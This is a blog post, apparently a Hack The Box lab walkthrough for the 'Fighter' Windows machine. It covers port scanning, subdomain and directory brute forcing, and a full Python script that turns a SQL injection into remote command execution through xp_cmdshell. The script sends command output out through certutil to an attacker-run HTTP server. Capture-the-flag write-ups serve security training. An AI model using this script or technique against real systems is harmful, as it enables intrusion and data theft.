<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	         WindowsDifficulty:	 InsanePoints:	     50Release:	 05 May 2018IP:	         10.10.10.72 User Blood:  00 days, 19 hours, 09 mins, 22 seconds.Root Blood:  01 days, 04 hours, 16 mins">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[fighter]">
<meta property="og:url" content="https://fdlucifer.github.io/2020/06/03/fighter/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="introduceOS:	         WindowsDifficulty:	 InsanePoints:	     50Release:	 05 May 2018IP:	         10.10.10.72 User Blood:  00 days, 19 hours, 09 mins, 22 seconds.Root Blood:  01 days, 04 hours, 16 mins">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb33.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb34.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb35.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb36.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb37.jpg">
<meta property="article:published_time" content="2020-06-02T22:40:28.000Z">
<meta property="article:modified_time" content="2020-08-16T16:48:07.925Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb33.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2020/06/03/fighter/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/06/03/fighter/","path":"2020/06/03/fighter/","title":"Hack-The-Box-walkthrough[fighter]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[fighter] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">46</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">209</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit-and-getshell-and-privilege-escalation"><span class="nav-number">3.</span> <span class="nav-text">exploit and getshell and privilege escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">3.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Contact-me"><span class="nav-number">3.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">209</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">46</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/06/03/fighter/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[fighter] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[fighter]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-06-03 06:40:28" itemprop="dateCreated datePublished" datetime="2020-06-03T06:40:28+08:00">2020-06-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2020-08-17 00:48:07" itemprop="dateModified" datetime="2020-08-17T00:48:07+08:00">2020-08-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>3.5k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>13 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	         Windows<br>Difficulty:	 Insane<br>Points:	     50<br>Release:	 05 May 2018<br>IP:	         10.10.10.72</p>
<p>User Blood:  00 days, 19 hours, 09 mins, 22 seconds.<br>Root Blood:  01 days, 04 hours, 16 mins, 21 seconds.</p>
<p>that’s crazy for me</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb33.jpg"></li>
<li><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></li>
</ul>
<span id="more"></span>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap and masscan as usaul</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># masscan -p1-65535 10.10.10.72 --rate=1000 -e tun0 &gt; ports</span></span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-04 02:35:05 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65535 ports/host]</span><br><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># ports=$(cat ports | awk -F &quot; &quot; &#x27;&#123;print $4&#125;&#x27; | awk -F &quot;/&quot; &#x27;&#123;print $1&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)</span></span><br><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># nmap -Pn -sV -sC -v -p$ports 10.10.10.72</span></span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 8.5</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/8.5</span><br><span class="line">|_http-title: StreetFighter Club</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>In the homepage, find the Domain name “streetfighterclub.htb”. add the domain to &#x2F;etc&#x2F;hosts file.</p>
<p>let’s look around, then find that there might be subdomains available that will give us more clues</p>
<p>intercept the request and send it to the intruder. We select where we want to brute force the request.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: §1§.streetfighterclub.htb</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>use namelist.txt located in &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;</p>
<p>find a subdomain called “members.streetfighterclub.htb” that gave HTTP code 403</p>
<p>then add the subdomain in &#x2F;etc&#x2F;hosts</p>
<p>open the webpage and got a 403 Forbidden error</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://members.streetfighterclub.htb/</span><br></pre></td></tr></table></figure>

<p>use dirb to scan</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirb http://members.streetfighterclub.htb/</span><br><span class="line"></span><br><span class="line">/old</span><br></pre></td></tr></table></figure>

<p>then find web pages inside that directory. As we know that it is IIS server we find “asp” files on the web server and find a page called “login.asp”.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirb http://members.streetfighterclub.htb/old -X .asp</span><br><span class="line"></span><br><span class="line">/login.asp</span><br></pre></td></tr></table></figure>

<p>now got </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://members.streetfighterclub.htb/old/login.asp</span><br></pre></td></tr></table></figure>

<h3 id="exploit-and-getshell-and-privilege-escalation"><a href="#exploit-and-getshell-and-privilege-escalation" class="headerlink" title="exploit and getshell and privilege escalation"></a>exploit and getshell and privilege escalation</h3><p>find that the web application is vulnerable to SQL injection in parameter “logintype&#x3D;2”.  We find username, password, and e-mail but were unable to login. So we tried command injection using SQL injection. We referred the following link.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cudGFybG9naWMuY29tL2VuL2Jsb2cvcmVkLXRlYW0tdGFsZXMtMHgwMS8=">From MSSQL to RCE<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>so we made the following python3 payload script</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">from html.parser import HTMLParser</span><br><span class="line">from http.server import BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line">query_id   = 0</span><br><span class="line"></span><br><span class="line">def decode(data):</span><br><span class="line">    parser = HTMLParser()</span><br><span class="line">    try:</span><br><span class="line">        <span class="comment"># We don&#x27;t like Unicode strings, do we?</span></span><br><span class="line">        decoded_data = base64.b64decode(data)</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&#x27;[-] decoding error&#x27;</span></span><br><span class="line">    <span class="built_in">return</span> decoded_data.decode(<span class="string">&#x27;utf8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def get_command():</span><br><span class="line">    try:</span><br><span class="line">        cmd = input(<span class="string">&#x27;:\&gt; &#x27;</span>)</span><br><span class="line">        t = threading.Thread(target=send_command, args=(cmd,))</span><br><span class="line">        t.start()</span><br><span class="line">    except:</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">def send_command(cmd):</span><br><span class="line">    global target_url, local_url</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;2;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;declare @r varchar(6120),@cmdOutput varchar(6120);&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;declare @res TABLE(line varchar(max));&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;insert into @res exec Xp_cmdshell %s;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;set @cmdOutput=(SELECT CAST((select stuff((select cast(char(10) as varchar(max)) + line FROM @res for xml path(&#x27;&#x27;)), 1, 1, &#x27;&#x27;)) as varbinary(max)) FOR XML PATH(&#x27;&#x27;), BINARY BASE64);&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;set @r=concat(&#x27;certutil -urlcache -f http://10.10.14.3/&#x27;,@cmdOutput);&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;exec Xp_cmdshell @r;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;--&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Data for login</span></span><br><span class="line">    login = &#123;</span><br><span class="line">        <span class="string">&#x27;B1&#x27;</span>: <span class="string">&#x27;LogIn&#x27;</span>,</span><br><span class="line">        <span class="comment"># &#x27;logintype&#x27;: &quot;1 AND ISNULL(ASCII(SUBSTRING((SELECT @@version LIMIT 0,1)),&quot;+str(limit)+&quot;,1)),0)&gt;&quot;+str(char),</span></span><br><span class="line">        <span class="string">&#x27;logintype&#x27;</span>: payload % (cmd),</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;rememberme&#x27;</span>: <span class="string">&#x27;ON&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requests.post(<span class="string">&quot;http://members.streetfighterclub.htb/old/verify.asp&quot;</span>, data=login)</span><br><span class="line"></span><br><span class="line">class MyServer(HTTPServer):</span><br><span class="line">    def server_activate(self):</span><br><span class="line">        <span class="comment"># get first command</span></span><br><span class="line">        get_command()</span><br><span class="line">        HTTPServer.server_activate(self)</span><br><span class="line"></span><br><span class="line">class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):</span><br><span class="line">    def log_request(self, *args, **kwargs):</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">    def log_message(self, *args, **kwargs):</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">    def do_GET(self):</span><br><span class="line">        global query_id</span><br><span class="line">        self.send_error(404)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Certutil sends 2 requets each time</span></span><br><span class="line">        <span class="keyword">if</span> query_id % 2 == 0:</span><br><span class="line">            output = self.path</span><br><span class="line"></span><br><span class="line">            <span class="comment"># if command output, decode it!</span></span><br><span class="line">            <span class="keyword">if</span> output != <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(decode(output[1:]))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># get next command</span></span><br><span class="line">            get_command()</span><br><span class="line"></span><br><span class="line">        query_id += 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># Fake server behaviour</span></span><br><span class="line">    handler = SimpleHTTPRequestHandler</span><br><span class="line">    handler.server_version = <span class="string">&#x27;nginx&#x27;</span></span><br><span class="line">    handler.sys_version = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    handler.error_message_format = <span class="string">&#x27;not found&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add SSL support if you wanna be a ninja!</span></span><br><span class="line">    httpd = MyServer((&#x27;<span class="number">0.0</span>.<span class="number">0.0</span>&#x27;, <span class="number">80</span>), handler)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        pass</span><br><span class="line">    httpd.server_close()</span><br></pre></td></tr></table></figure>

<p>then run the script</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># python3 exploit.py </span></span><br><span class="line">:\&gt; <span class="built_in">whoami</span></span><br><span class="line">fighter\sqlserv</span><br></pre></td></tr></table></figure>

<p>or use the following payload to spawn a reverse shell</p>
